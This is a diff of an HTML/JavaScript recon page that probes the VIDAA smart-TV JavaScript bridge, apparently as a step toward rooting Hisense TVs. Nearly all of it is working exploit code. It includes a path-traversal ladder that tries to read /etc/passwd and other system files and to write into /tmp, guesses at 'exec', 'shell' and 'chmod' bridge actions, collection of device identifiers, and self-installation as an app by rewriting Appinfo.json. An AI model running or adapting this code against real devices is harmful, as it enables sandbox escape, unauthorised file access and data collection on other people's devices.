@@ -8,18 +8,28 @@
   #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
          word-break: break-all; padding: 10px; }
   .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
+  #btns { position: fixed; top: 6px; right: 6px; z-index: 2; }
+  #btns div { display: inline-block; background: #123; color: #6cf; border: 2px solid #6cf;
+              padding: 10px 16px; margin-left: 8px; font: bold 18px Menlo, monospace; }
 </style>
 </head>
 <body>
+<div id="btns">
+  <div onclick="location.reload()">RERUN</div>
+  <div id="inst">INSTALL AS APP</div>
+</div>
 <div id="out"></div>
 <script>
 (function () {
   "use strict";
 
   // Recon probe for the VIDAA JS bridge (HiUtils_createRequest et al).
-  // Read-only except two write probes: the known-good websdk/ baseline and
-  // one file on /tmp (tmpfs — gone at reboot). Everything is POSTed to
-  // /api/recon and echoed on screen.
+  // v2: adds path-traversal ladder for fileRead/fileWrite (the sandbox only
+  // accepted relative paths in v1), TV identity calls, and a self-install
+  // tile — the installed-app context is where file:// XHR worked in 2021.
+  // Writes are limited to websdk/ (baseline) and traversal probes targeting
+  // /tmp; a probe that miscounts depth can only drop a tiny text file named
+  // alvidaa_recon_probe.txt somewhere non-executed.
 
   var el = document.getElementById("out");
   var report = {
@@ -27,7 +37,9 @@
     ua: navigator.userAgent,
     href: location.href,
     bridge_functions: [],
+    identity: {},
     files: {},
+    traversal: {},
     write_probes: {},
     action_guesses: {},
     xhr_file: {}
@@ -36,6 +48,12 @@
   function trunc(s, n) {
     s = String(s == null ? "" : s);
     return s.length > n ? s.slice(0, n) + "…(" + s.length + " chars)" : s;
+  }
+
+  function normMsg(m) {
+    if (m == null) return "";
+    if (typeof m === "string") return m;
+    try { return JSON.stringify(m); } catch (e) { return String(m); }
   }
 
   function line(text, cls) {
@@ -72,11 +90,23 @@
       if (typeof HiUtils_createRequest !== "function") return { error: "no bridge" };
       var r = HiUtils_createRequest(action, params);
       if (r && typeof r === "object") {
-        return { ret: r.ret, msg: trunc(r.msg, 20000) };
+        return { ret: r.ret, msg: normMsg(r.msg) };
       }
       return { value: trunc(r, 2000) };
     } catch (e) {
       return { exception: String(e) };
+    }
+  }
+
+  function hiFn(name) {
+    try {
+      var f = window[name];
+      if (typeof f !== "function") return { error: "missing" };
+      var r = f();
+      if (r && typeof r === "object") return normMsg(r);
+      return trunc(r, 2000);
+    } catch (e) {
+      return "threw: " + String(e);
     }
   }
 
@@ -102,88 +132,157 @@
   var READ_PATHS = [
     "websdk/Appinfo.json",   // control — known good
     "/etc/passwd",
-    "/etc/group",
-    "/etc/inittab",
-    "/etc/login.sh",
-    "/etc/profile",
-    "/etc/fstab",
-    "/etc/hostname",
-    "/etc/version",
-    "/etc/version.txt",
-    "/etc/firmware_version",
-    "/etc/init.d/rcS",
     "/proc/mounts",
-    "/proc/cmdline",
-    "/proc/cpuinfo",
-    "/proc/1/cmdline",
-    "/proc/self/status",
     "/3rd_rw/",
-    "/tmp/",
-    "/usr/bin/"
+    "/tmp/"
+  ];
+
+  // The bridge resolved "websdk/Appinfo.json" relative to some base dir that
+  // contains a websdk/ child. Depth-0 convention: relative to base.
+  // Depth-1 convention: relative to base/websdk/. Ladder both.
+  var TRAVERSAL_TARGETS = ["proc/mounts", "etc/passwd", "etc/inittab", "etc/login.sh"];
+  var WRITE_TARGET = "tmp/alvidaa_recon_probe.txt";
+
+  var IDENTITY_CALLS = [
+    "Hisense_GetFirmWareVersion", "Hisense_GetOSVersion", "Hisense_GetChipSetName",
+    "Hisense_GetModelName", "Hisense_GetDeviceID", "Hisense_GetDeviceCode",
+    "Hisense_GetSerialType", "Hisense_GetRegion", "Hisense_GetCountryCode",
+    "Hisense_GetPanelResolution", "Hisense_GetChromiumVersion",
+    "Hisense_GetCurrentBrowser", "Hisense_GetBrand", "Hisense_GetUuid",
+    "Hisense_GetIsHotelMode", "Hisense_GetVersionStatus", "Hisense_GetFeatureCode",
+    "Hisense_GetCapabilityCode", "Hisense_GetNetType", "Hisense_GetIPAddress"
   ];
 
   var ACTION_GUESSES = [
     "exec", "shell", "run", "runapp", "startapp", "getdeviceinfo",
     "getsysinfo", "sysinfo", "getfilelist", "listdir", "readdir",
-    "installapp", "getmac", "getversion", "filelist"
+    "installapp", "getmac", "getversion", "filelist", "copyfile",
+    "movefile", "deletefile", "chmod", "unzip", "install"
   ];
 
+  function installReconApp() {
+    var status = document.getElementById("inst");
+    try {
+      var base = location.href.replace(/recon\.html.*$/, "");
+      var icon = base + "icon.png";
+      var cur = hiCall("fileRead", { path: "websdk/Appinfo.json", mode: 6 });
+      var list = cur.ret ? JSON.parse(cur.msg) : { AppInfo: [] };
+      list.AppInfo = list.AppInfo.filter(function (a) { return a.Id !== "vidaa-recon"; });
+      list.AppInfo.push({
+        Id: "vidaa-recon", AppName: "Recon", Title: "Recon",
+        URL: base + "recon.html", StartCommand: base + "recon.html",
+        IconURL: icon, Icon_96: icon, Image: icon, Thumb: icon,
+        Type: "Browser", InstallTime: "2026-10-29",
+        RunTimes: 0, StoreType: "custom", PreInstall: false
+      });
+      var w = hiCall("fileWrite", { path: "websdk/Appinfo.json", mode: 6,
+                                    writedata: JSON.stringify(list) });
+      status.textContent = isOk(w.ret) ? "INSTALLED (restart TV)" : "install failed";
+      status.style.color = isOk(w.ret) ? "#8f8" : "#f88";
+    } catch (e) {
+      status.textContent = "install threw: " + String(e);
+    }
+  }
+
   function run() {
-    line("== alvidaa recon ==");
-    line(report.ua);
-    line("page: " + report.href, "warn");
+    line("== alvidaa recon v2 ==");
+    line(report.ua, "warn");
+    line("page: " + report.href);
 
     // 1. bridge surface
     report.bridge_functions = enumBridge();
-    line("bridge: " + (report.bridge_functions.length
-        ? report.bridge_functions.join("  ") : "(none found)"),
+    line("bridge: " + report.bridge_functions.length + " functions (full list in report)",
       report.bridge_functions.length ? "ok" : "err");
 
-    // 2. fileRead sweep
-    line("-- fileRead sweep --", "hdr");
-    for (var i = 0; i < READ_PATHS.length; i++) {
-      var p = READ_PATHS[i];
-      var r = hiCall("fileRead", { path: p, mode: 6 });
-      report.files[p] = r;
-      var ok = r && isOk(r.ret);
-      line((ok ? "[ok] " : "[--] ") + p + (ok ? ": " + trunc(r.msg, 200) : ""), ok ? "ok" : "");
+    // 2. TV identity — pins SoC/firmware generation for the firmware lane
+    line("-- identity --", "hdr");
+    for (var i = 0; i < IDENTITY_CALLS.length; i++) {
+      var n = IDENTITY_CALLS[i];
+      var v = hiFn(n);
+      report.identity[n] = v;
+      if (v !== "missing" && !/^threw:/.test(String(v))) {
+        line(n.replace("Hisense_", "") + " = " + trunc(v, 120), "ok");
+      }
     }
 
-    // 3. write probes (baseline + one tmpfs probe, nothing persistent)
-    line("-- write probes --", "hdr");
+    // 3. absolute-path read sweep (v1 showed these all fail — short recheck)
+    for (var j = 0; j < READ_PATHS.length; j++) {
+      var p = READ_PATHS[j];
+      var r = hiCall("fileRead", { path: p, mode: 6 });
+      report.files[p] = r;
+      line((isOk(r.ret) ? "[ok] " : "[--] ") + p + (isOk(r.ret) ? ": " + trunc(r.msg, 200) : ""),
+        isOk(r.ret) ? "ok" : "");
+    }
+
+    // 4. traversal ladder — the money question
+    line("-- traversal ladder --", "hdr");
+    var hitDepth = null;
+    for (var d = 1; d <= 6 && hitDepth === null; d++) {
+      var pref = new Array(d + 1).join("../");
+      var res = hiCall("fileRead", { path: pref + "proc/mounts", mode: 6 });
+      report.traversal["base_depth" + d + "_proc_mounts"] = res;
+      if (isOk(res.ret)) {
+        hitDepth = d;
+        line("[hit] depth " + d + " from base: " + pref + "proc/mounts ->", "ok");
+        line(trunc(res.msg, 600), "warn");
+      }
+    }
+    var wsDepth = null;
+    for (var d2 = 1; d2 <= 6 && wsDepth === null; d2++) {
+      var pref2 = "websdk/" + new Array(d2 + 1).join("../");
+      var res2 = hiCall("fileRead", { path: pref2 + "proc/mounts", mode: 6 });
+      report.traversal["websdk_depth" + d2 + "_proc_mounts"] = res2;
+      if (isOk(res2.ret)) {
+        wsDepth = d2;
+        line("[hit] depth " + d2 + " from websdk: " + pref2 + "proc/mounts ->", "ok");
+        line(trunc(res2.msg, 600), "warn");
+      }
+    }
+    if (hitDepth === null && wsDepth === null) {
+      line("traversal: no escape at any depth — sandbox holds", "err");
+    } else {
+      // dump the interesting files at the discovered depth
+      var depth = hitDepth !== null ? hitDepth : wsDepth;
+      var pref3 = hitDepth !== null ? new Array(depth + 1).join("../")
+                                    : "websdk/" + new Array(depth + 1).join("../");
+      for (var k = 0; k < TRAVERSAL_TARGETS.length; k++) {
+        var t = TRAVERSAL_TARGETS[k];
+        var tr = hiCall("fileRead", { path: pref3 + t, mode: 6 });
+        report.traversal["file_" + t] = tr;
+        if (isOk(tr.ret)) line("[ok] " + t + ": " + trunc(tr.msg, 300), "ok");
+      }
+      // and the write question: /tmp via traversal (tmpfs — non-persistent)
+      var wr = hiCall("fileWrite", { path: pref3 + WRITE_TARGET, mode: 6,
+                                     writedata: "alvidaa traversal write " + report.started });
+      report.write_probes.traversal_tmp = { depth: depth, via: pref3, result: wr };
+      line("[write " + pref3 + WRITE_TARGET + "] " + (isOk(wr.ret)
+          ? "TRAVERSAL WRITE WORKS — root lane open" : JSON.stringify(trunc(wr, 200))),
+        isOk(wr.ret) ? "ok" : "err");
+      if (isOk(wr.ret)) {
+        var rb = hiCall("fileRead", { path: pref3 + WRITE_TARGET, mode: 6 });
+        report.write_probes.traversal_tmp_readback = rb;
+        line("[readback] " + trunc(rb.msg, 120), "warn");
+      }
+    }
+
+    // 5. write probes (websdk baseline always; /tmp absolute recheck)
     var base = hiCall("fileWrite", {
       path: "websdk/recon_probe.txt", mode: 6,
       writedata: "alvidaa recon " + report.started
     });
     report.write_probes.relative = base;
     line("[write websdk/recon_probe.txt] " + (isOk(base.ret) ? "ok (baseline)"
-        : JSON.stringify(trunc(base, 300))), isOk(base.ret) ? "ok" : "err");
+        : JSON.stringify(trunc(normMsg(base.msg), 300))), isOk(base.ret) ? "ok" : "err");
 
-    var tmp = hiCall("fileWrite", {
-      path: "/tmp/alvidaa_recon_probe.txt", mode: 6,
-      writedata: "alvidaa recon " + report.started
-    });
-    report.write_probes.absolute_tmp = tmp;
-    line("[write /tmp/alvidaa_recon_probe.txt] " + (isOk(tmp.ret)
-        ? "WRITABLE — absolute paths accepted" : JSON.stringify(trunc(tmp, 300))),
-      isOk(tmp.ret) ? "ok" : "err");
-    if (isOk(tmp.ret)) {
-      var rb = hiCall("fileRead", { path: "/tmp/alvidaa_recon_probe.txt", mode: 6 });
-      report.write_probes.absolute_tmp_readback = rb;
-      line("[readback] " + trunc(rb.msg, 120), "warn");
+    // 6. action-name guesses
+    for (var a = 0; a < ACTION_GUESSES.length; a++) {
+      var gname = ACTION_GUESSES[a];
+      var g = hiCall(gname, { path: "/etc/hostname", mode: 6 });
+      report.action_guesses[gname] = g;
+      if (isOk(g.ret)) line("[hit] " + gname + ": " + trunc(g.msg, 200), "warn");
     }
 
-    // 4. action-name guesses — does the bridge expose anything stronger?
-    line("-- action guesses --", "hdr");
-    for (var j = 0; j < ACTION_GUESSES.length; j++) {
-      var a = ACTION_GUESSES[j];
-      var g = hiCall(a, { path: "/etc/hostname", mode: 6 });
-      report.action_guesses[a] = g;
-      if (isOk(g.ret)) line("[hit] " + a + ": " + trunc(g.msg, 200), "warn");
-    }
-
-    // 5. file:// XHR — works only in HTML5-app context on some firmwares
-    line("-- file:// XHR --", "hdr");
+    // 7. file:// XHR — only ever worked in HTML5-app context
     var xhrPaths = ["file:///proc/mounts", "file:///etc/passwd", "file:///etc/"];
     var chain = Promise.resolve();
     xhrPaths.forEach(function (fp) {
@@ -206,7 +305,7 @@
         x.onload = function () {
           line("report saved (" + x.status + ", " + body.length +
                " bytes) — view at /api/recon", "ok");
-          line("== done ==", "hdr");
+          line("== done — RERUN after TV restart, INSTALL AS APP to test app context ==", "hdr");
         };
         x.onerror = function () {
           line("could not POST report — read results from this screen", "err");
@@ -219,6 +318,7 @@
     });
   }
 
+  document.getElementById("inst").addEventListener("click", installReconApp);
   run();
 })();
 </script>
